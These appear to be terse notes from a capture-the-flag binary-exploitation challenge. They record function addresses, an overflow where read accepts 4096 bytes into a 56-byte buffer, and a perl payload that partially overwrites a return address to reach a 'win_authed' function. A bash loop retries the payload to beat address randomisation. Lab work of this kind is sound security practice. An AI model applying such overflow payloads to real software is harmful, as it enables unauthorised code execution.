0x00000000000012e9 bin_padding0x00000000000021e6 win_authed0x0000000000002303 challenge0x0000000000002460 mainmax length = 56

but in read, it will take 4096 length


0x7fffd6392d30:	0x41414141 
0x00007fffd6392d98

target 0x000064a300fb4202


perl -e 'print "\x00"."A"x103 . "\x02\x72" ' | ./binary-exploitation-null-write

```

for i in $(seq 1 100); do
	out=$(perl -e 'print "\x00"."A"x103 . "\x02\x72" ' | ./binary-exploitation-null-write)
	if echo "$out" | grep -i "pwn"; then
		echo "pwned"
	fi
done
```